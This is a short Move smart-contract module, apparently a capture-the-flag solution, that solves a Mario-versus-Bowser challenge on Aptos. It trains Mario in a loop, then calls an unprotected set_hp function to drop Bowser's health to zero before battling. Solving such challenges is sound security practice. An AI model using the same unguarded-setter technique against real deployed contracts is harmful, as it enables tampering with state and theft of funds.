module solution::exploit {
    use challenge::router::{Self, Mario, Bowser};
    use aptos_framework::object;

    public entry fun solve(account: &signer) {
        let addr = router::start_game(account);
        let mario = object::address_to_object<Mario>(addr);
        for (i in 0..127) {
            router::train_mario(account, mario);
        };
        router::battle(account, mario);
        let wrapper = router::get_wrapper();
        let bowser = object::address_to_object<Bowser>(wrapper);
        router::set_hp(account, bowser, 0);
        router::battle(account, mario);
    }
}